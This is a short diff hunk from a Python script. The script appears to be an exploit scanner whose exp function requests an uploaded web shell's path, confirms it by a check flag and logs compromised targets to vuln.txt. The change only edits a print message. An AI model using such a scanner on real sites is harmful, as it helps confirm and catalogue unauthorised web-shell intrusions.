@@ -89,7 +89,7 @@ def exp(u):
                 shellPath = u + webPath
                 req3 = requests.get(shellPath, headers=header, verify=False, timeout=25)
                 if shellCheckFlag in req3.text:
-                    print("[Shell Path：]" + wirte_targets(shellPath, "vuln.txt"))
+                    print("[Shell]:" + wirte_targets(shellPath, "vuln.txt"))
     except:
         return
 
